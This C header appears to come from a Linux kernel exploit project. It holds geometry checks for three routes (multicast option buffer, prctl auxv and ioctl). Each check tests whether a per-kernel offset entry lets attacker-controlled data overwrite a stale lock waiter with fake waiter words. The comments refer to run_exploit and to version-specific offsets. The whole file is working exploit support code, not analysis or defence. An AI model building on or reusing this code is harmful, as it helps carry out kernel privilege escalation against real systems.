#ifndef ROUTE_GEOM_H
#define ROUTE_GEOM_H

#include "offsets.h"

/* Geometry a 5.15 entry must carry for the mcast stamp to cover the stale
 * waiter: the option buffer has to reach past waiter_off + lock_offset.
 * One definition so the route predicate, run_exploit's 5.15 refusal, and the
 * host test cannot diverge. static inline so the test compiles it with no
 * link dependencies. */
static inline int mcast_geometry_ok_off(const struct kernel_offsets *o) {
  return o && o->mcast_waiter_off > 0 && o->mcast_buffer_size > 0 &&
         (uint32_t)o->mcast_waiter_off + o->mcast_lock_offset + 8 <=
             o->mcast_buffer_size;
}

/* Geometry a prctl-route entry must carry: the auxv payload is the stamp
 * buffer, so every waiter word it writes has to sit inside prctl_auxv_size.
 * The span is the distance from w0 to the last word write_waiter_words
 * touches, 0x50 + 8 for the compact layout and 0x68 + 8 for the rb_node one
 * (the target.h FAKE_WAITER_* offsets). 0x400 is a stack sanity cap only. */
static inline int prctl_geometry_ok_off(const struct kernel_offsets *o) {
  if (!o || !o->prctl_auxv_size || o->prctl_waiter_off == 0) return 0;
  uint32_t span = o->compact_waiter ? 0x58 : 0x70;
  return o->prctl_auxv_size <= 0x400 &&
         (uint32_t)o->prctl_waiter_off + span <= o->prctl_auxv_size;
}

/* Geometry an ioctl-route entry must carry: a command, a copied-struct size,
 * and the signed byte offset inside that struct of the waiter base. The last
 * waiter word the stamp writes is base+ww_ctx+8, so the buffer has to reach
 * base+0x70 (rb_node) or base+0x58 (compact); a negative offset means the copy
 * starts partway into the waiter and only the tail words are stamped. 0x800 is
 * a stack sanity cap. */
static inline int ioctl_geometry_ok_off(const struct kernel_offsets *o) {
  if (!o || !o->ioctl_cmd || !o->ioctl_buf_size) return 0;
  if (o->ioctl_buf_size > 0x800) return 0;
  uint32_t span = o->compact_waiter ? 0x58 : 0x70;
  return o->ioctl_waiter_off + (int)span <= (int)o->ioctl_buf_size;
}

#endif
